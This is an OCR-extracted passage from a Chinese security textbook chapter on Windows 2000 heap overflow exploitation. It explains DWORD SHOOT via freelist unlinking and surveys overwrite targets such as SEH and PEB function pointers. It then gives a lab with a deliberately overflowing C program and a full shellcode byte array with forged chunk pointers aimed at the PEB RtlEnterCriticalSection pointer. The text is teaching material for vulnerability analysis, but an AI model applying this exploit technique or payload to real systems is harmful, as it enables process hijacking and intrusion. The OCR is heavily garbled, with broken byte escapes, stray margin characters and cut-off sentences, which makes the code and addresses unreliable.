用VC6.0默认编译选项将其编译成release版本，在Windows2000操作系统上运行。如上
166
---
## Page 192
第
节所述，为了调试真正状态的堆，应该直接运行程序，让其在_asmint3处自已中断，然后在
5
附上调试器。
章
三次内存释放操作结束后，直接在内存区按快捷键Ctrl+G观察0x00520688处的堆块状况
堆
如图5.3.3所示。
溢出
利
用
Free blockh1
Freeblockh5
Large
Free
block
图5.3.3DWORDSHOOT前堆块的状态
从0x00520680处开始，共有9个堆块，如表5-3-3所示。
表5-3-3堆块情况
起始位置
Flag
Size单位：8bytes
前向指针flink
后向指针blink
hl
0x00520680
空闲态0x00
0x0002
0x005206A8
0x00520188
h2
0x00520690
占用态0x01
0x0002
无
无
h3
0x005206A0
空闲态0x00
0x0002
0x005206C8
0x00520688
h4
0x005206B0
占用态0x01
0x0002
无
无
h5
0x005206C0
空闲态0x00
0x0002
0x00520188
0x005206A8
h6
0x005206D0
占用态0x01
0x0002
无
无
尾块
0x00520178
0x00520178
0x005206E0
最后一项（0x10）
0x0124
(freelist[o))
(freelistjo)
空表索引区的状况如图5.3.4所示。
除了freelist[O]和freelist[2]之外，所有的空表索引都为空（指向自身）。
综上所述，整条freelist[2]链表的组织情况如图5.3.5所示。
这时，最后一次8字节的内存请求会把freelist[2]的最后一项（原来的h5）分配出去，这
167
---
## Page 193
day安全
0
意味着将最后一个结点从双向链表中“卸下”
如果我们现在直接在内存中修改h5堆块中的空表指针（当然攻击发生时是由于溢出而改
写的），那么应该能够观察到DWORDSHOOT现象，如图5.3.6所示。
软件漏洞分析技术（第2版）
Freellst[o]
Freellst[2]
图5.3.4DWORDSHOOT前堆表的状态
Freelist[2] 0x00520188:
flink:0x00520688
bink:0x005206C8
h1（pointersection)Ox00520688:flink:Ox005206A8
bink:0x00520188
h3（pointersection)Ox005206A8:
flink:0x005206C8
bink:0x00520688
h5( pointer section) 0x005206C8:
flink:0x00520188
bink:0x005206A8
图5.3.5
空闲双向链表示意图
168
---
## Page 194
第
如图5.3.6所示，直接在调试器中手动将0x005206C8处的前向指针改为0x44444444，后
5
向指针改为0x00000000。当最后一个分配函数被调用后，调试器被异常中断，原因是无法将
章
0x44444444写入0x00000000。当然，如果我们把射击目标定为合法地址，这条指令执行后，
堆
0x44444444将会被写入目标。
溢出利
MIEIX
用
PTRDS:OI].FCX
77FCa
FCX.F
DS:IEEX+A]F
ND FDX.1
td11./7FL
将0x44444444（伪连的flink）
写入0x00000000（伪造的blink）
由于0x00000000为非法内存，发生内存访间错误
@000
8171 0
手动修改
B12F
块首指针
图5.3.6制造DWORDSHOOT
以上只是引发DWORDSHOOT的一种情况。事实上，堆块的分配、释放、合并操作都能
引发DWORDSHOOT（因为都涉及链表操作），甚至快表也可以被用来制造DWORDSHOOT。
由于其原理上基本一致，故不一一资述，您可以利用本节的理论分析和调试技巧自己举一反三。
5.4堆溢出利用（下）一
代码植入
5.4.1DWORDSHOOT的利用方法
堆溢出的精髓是获得一个DWORDSHOOT的机会，所以，堆溢出利用的精髓也就是
DWORDSHOOT的利用。
与栈溢出中的“地毯式轰炸”不同，堆溢出更加精准，往往直接狙击重要目标。精准是
DWORDSHOOT的优点，但“火力不足”有时也会限制堆溢出的利用，这样就需要选择最重
要的自标用来“狙击”。
给出一个完整的利用堆溢出执行shellcode的例子。
DWORDSHOOT的常用目标（WindowsXPSP1之前的平台）大概可以概括为以下几类。
169
---
## Page 195
0
day
（1）内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。例如，
安
更改身份验证函数的返回值就可以直接通过认证机制。2.2节中修改邻接变量的小试验就是这
全
种利用方式的例子。在这种应用场景中，DWORDSHOOT要比栈溢出强大得多，因为栈溢出
：
时溢出的数据必须连续，而DWORDSHOOT可以更改内存中任意地址的数据。
软
件
（2）代码逻辑：修改代码段重要函数的关键逻辑有时可以达到一定攻击效果，例如，程序
漏
分支处的判断逻辑，或者把身份验证函数的调用指令覆盖为0x90(nop)。这种方法有点类似于
洞
软件破解技术中的“爆破”-一通过更改一个字节而改变整个程序的流程，第1章中的破解小
分
试验就是这种应用的例子。
析
技
（3）函数返回地址：栈溢出通过修改函数返回地址能够劫持进程，堆溢出也一样可以利用
术
DWORDSHOOT更改函数返回地址。但由于栈顿移位的原因，函数返回地址往往是不固定的，
第
甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORDSHOOT在这
种情况下有一定局限性，因为移动的靶子不好瞄准。
2
（4）攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容
版
易引起异常，因此异常处理机制所使用的重要数据结构往往会成为DWORDSHOOT的上等目
标，这包括 S.E.H（structure exception handler）、FV.E.H（First Vectored Exception Handler）、进
程环境块（P.E.B）中的U.E.F(UnhandledExceptionFilter)、线程环境块(T.E.B)中存放的第一个
S.E.H指针（T.E.H)。有关Windows异常处理的知识和利用将在第6章中进行系统的介绍。
（5）函数指针：系统有时会使用一些函数指针，比如调用动态链接库中的函数、C++中的
虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地动持进程。但可借的
是，不是每一一个漏洞都可以使用这项技术，这取决于软件的开发方式。
（6）PE.B中线程同步函数的入口地址：天才的黑客们发现在每个进程的PE.B中都存放着
一对同步函数指针，指向RtlEnterCriticalSectionO和RtlLeaveCriticalSectionO，并且在进程退出
时会被ExitProcessO调用。如果能够通过DWORDSHOOT修改这对指针中的其中一个，那么
在程序退出时ExitProcessO将会被骗去调用我们的shellcode。由于PE.B的位置始终不会变化，
这对指针在PE.B中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补
丁版本的exploit成为可能。这种方法一经提出就立刻成为了Windows平台下堆溢出利用的最
经典方法之一，因为静止的靶子比活动的靶子好打得多，我们只需要把枪架好，闭着眼睛扣扳
机就是了。
鉴于我们目前的知识体系还不完善，这里只是初步总结了堆溢出的利用方式。在学习完下
一章关于异常处理方面的知识后，我们将重新总结内存狙击的利用方式。
5.4.2狙击P.E.B中RtlEnterCritical-Section的函数指针
Windows为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量
（semaphore）、临界区（criticalsection）等。许多操作都要用到这些同步机制。
当进程退出时，ExitProcessO函数要做很多善后工作，其中必然需要用到临界区函数
RtEnterCriticalSectionO和RtlLeaveCriticalSectionO来同步线程防止“脏数据”的产生。
170
---
## Page 196
第
不知什么原因，微软的工程师似乎对ExitProcessO情有独钟，因为它调用临界区函数的方
5
法比较独特，是通过进程环境块PE.B中偏移0x20处存放的函数指针来间接完成的。具体说来
章
就是在Ox7FFDF020处存放着指向RtIEnterCriticalSectionO的指针，在Ox7FFDF024处存放着指
堆
向RtlLeaveCriticalSectionO的指针。
溢
题外话：从Windows2003Server开始，微软已经修改了这里的实现。WindowsXP和
出
利
Windows2003中的安全问题将在后面章节中讨论。在实验开始前，请您务必看清关于
用
实验平台的说明。
这里，我们不妨以Ox7FFDFO24处的RtlEnterCriticalSectionO指针为目标，联系一下DWORD
SHOOT后，劫持进程、植入代码的全套动作。
用于实验的代码如下。
#include 
charshe11c0de[]=*\x90\x90\x90\x90\x90\x90\x90\x90
main()
HLOCALh1=0,h2=0;
HANDLE hp;
hp=HeapCreate（0,0x1000,0x10000);
h1=HeapA11oc（hp,HEAP_ZERO_MEMORY,200);
_asmint3//used to breakprocess
memcpy(h1,she11code,0x200);//overf1ow,0x200=512
h2=HeapA11oc（hp,HEAP_ZERO_MEMORY,8);
return0:
实验环境如表5-4-1所示。
表5-4-1实验环境
推荐使用的环境
备注
操作系统
Windows2000虚拟机
若在其它操作系统上调试，实验将会失败
编详器
Visual C++ 6.0
编译选项
默认编译选项
GS编译选项将使实验失败
build版本
release版本
如使用debug版本，实验将会失败
说明：堆分配算法依赖于操作系统版本、编译器版本、编译选项、build类型等因素，请在实验前务必确定实验环境是
的shellcode起始地址等若干地址离要经过动态调试重新确定。
先简单地解释一下程序和实验步骤。
回0电中1（）
（2）memcpy的上限错误地写成了0x200，这实际上是512字节，所以会产生溢出。
（3）h1分配完之后，后边紧接着的是一个大空闲块（尾块）。
171
---
## Page 197
day
0
（4）超过200字节的数据将覆盖尾块的块首。
安
（5）用伪造的指针覆盖尾块块首中的空表指针，当h2分配时，将导致DWORDSHOOT。
全
（6）DWORDSHOOT的目标是Ox7FFDF020处的RtlEnterCriticalSectionO函数指针，可以
简单地将其直接修改为shellcode的位置。
软
件漏
（7）DWORDSHOOT完毕后，堆溢出导致异常，最终将调用ExitProcess(O结束进程。
（8）ExitProcessO在结束进程时需要调用临界区函数来同步线程，但却从P.E.B中拿出了指
洞
向shellcode的指针，因此shellcode被执行。
分析
实验平台为Windows2000sp4。用VC6.0默认编译选项将代码build成release版本。和前
技
面一样，为了能够调试真实的堆状态，我们在代码中手动加入了一个断点：
术
asmint3
（第
依然是直接运行.exe文件，在断点将进程中断时，再把调试器attach上。
2
版
如图5.4.1所示，与我们分析一致，200字节之后便是尾块的块首。
Rudresss
h1的块首
h1的块身
200字节的0x90
空装指针
下一个空闲块（尾块）的块首
图5.4.1实验程序中的堆块分布情况
缓冲区布置如下。
（1）将我们那段168字节的shllcode用0x90字节补充为200字节。
（2）紧随其后，附上8字节的块首信息。为了防止在DWORDSHOOT发生之前产生异常，
（3）前向指针是DWORDSHOOT的“子弹”，这里直接使用shellcode的起始地址
0x00520688。
172
---
## Page 198
第
5
注意：shellcode的起始地址0x00520688需要在调试时确定。有时，HeapCreate(函数
章
创建的堆区起始位置会发生变化。
堆
期
这时，整个缓冲区的内容如下。
出
char shellcode[]=
利
用
"1x901x901x901x901x901x90\x901x90*
1x901x901x90\x901x901x90\x90\×901x901x901x90\x901x901x90\x901x90*
"\xFC\x68\x6A\x0A1x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53*
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B*
\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\×95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59*
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A*
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75*
\xE4\x8B\x59\x24\x03\xDD\x66\x8B\×3C\x7B\x8B\x59\x1C\x03\xDD\x03
*\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB*
"\x53\x68\x77\x651x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50*
*\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90*
\x16\x01\x1A\x00\x00\x10\x00\x00*//headoftheajacentfree block
\x88\x06\x52\x00\x20\xf0\xfd\x7f*;
运行一下，发现那个可爱的显示failwest的消息框没有蹦出来。原来，这里有一个问题：
被我们修改的P.E.B里的函数指针不光会被ExitProcessO调用，shellcode中的函数也会使用。
当shellcode的函数使用临界区时，会像ExitProcessO一样被骗。
为了解决这个问题，我们对shellcode稍加修改，在一开始就把我们DWORDSHOOT的指
针修复回去，以防出错。重新调试一遍，记下0x7FFDF020处的函数指针为0x77F8AA4C。
提示：P.E.B中存放RtlEnterCriticalSectionO函数指针的位置Ox7FFDF020是固定的，
但是，RtlEnterCriuicalSectionO的地址也就是这个指针的值0x77F8AA4C有可能会因为
补丁和操作系统而不一样，请在动态调试时确定。
这可以通过下面3条指令实现，如表5-4-2所示。
表5-4-2指令与对应机器码
指令
机器码
MOVEAX,7FFDF020
“xB8x20xF0xFDx7F
MOVEBX.77F8AA4C（可能斋要调试确定这个地址）
"xBBx4CxAAlxF8lx77